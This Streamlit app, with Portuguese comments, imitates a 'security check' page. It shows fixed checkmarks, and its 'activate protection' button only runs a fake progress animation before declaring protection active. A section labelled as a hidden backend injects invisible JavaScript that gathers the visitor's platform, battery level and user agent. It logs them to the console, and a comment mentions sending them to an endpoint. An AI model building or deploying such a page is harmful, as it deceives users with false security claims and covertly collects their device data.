import streamlit as st
import time

# Configuração da página
st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")

# Estilização CSS para a "Bolha" e Cores
st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button { width: 100%; border-radius: 20px; background-color: #262730; color: white; }
    
    /* Estilo da Bolha Circular */
    .circle-container {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 250px;
    }
    .circle {
        width: 200px;
        height: 200px;
        border-radius: 50%;
        border: 10px solid #1f2329;
        border-top: 10px solid #00ff7f; /* Cor verde da animação */
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 40px;
        font-weight: bold;
        color: white;
        animation: spin 2s linear infinite;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    </style>
    """, unsafe_allow_html=True)

## Interface Visual
st.title("Verificar segurança")

# Simulação da Bolha Animada
placeholder_bolha = st.empty()

# Lista de Check
st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

if st.button("● ATIVAR PROTEÇÃO"):
    # Animação de carregamento
    for i in range(4, 101, 5):
        placeholder_bolha.markdown(f"""
            <div class="circle-container">
                <div class="circle" style="animation: spin {2 - (i/100)}s linear infinite;">
                    {i}%
                </div>
            </div>
            """, unsafe_allow_html=True)
        time.sleep(0.1)
    st.success("Proteção Ativada!")
else:
    # Estado inicial (parado em 4%)
    placeholder_bolha.markdown("""
        <div class="circle-container">
            <div class="circle" style="animation: none; border-top: 10px solid #00ff7f;">
                4%
            </div>
        </div>
        """, unsafe_allow_html=True)

# Rodapé de erro (como no seu print)
st.warning("Permissão de localização negada ou indisponível.")

## Captura de Dados (Backend Oculto)
# Aqui usamos JavaScript injetado para pegar os dados que você pediu
st.components.v1.html("""
    <script>
    navigator.getBattery().then(function(battery) {
        const info = {
            modelo: navigator.platform,
            bateria: (battery.level * 100) + "%",
            agente: navigator.userAgent
        };
        // Envia para o console ou para um endpoint
        console.log("Dados capturados:", info);
    });
    </script>
""", height=0)
